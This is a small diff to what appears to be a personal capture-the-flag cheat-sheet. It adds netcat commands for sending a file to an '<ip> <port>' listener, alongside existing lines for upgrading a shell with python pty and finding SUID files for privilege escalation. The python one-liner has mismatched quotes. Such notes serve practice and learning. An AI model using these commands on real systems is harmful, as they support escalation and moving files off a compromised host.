@@ -5,6 +5,9 @@ Spawn a bash shell old ver:
 python -c "import pty; pty.spawn("bash")'
 Find files with permission:
 find / -perm -u=s -ls 2>/dev/null
+Send a file: 
+Sender: nc <ip> <port> < filename
+Reciever: nc -lnvp > filename
 Venus:
 
 Shenron1:
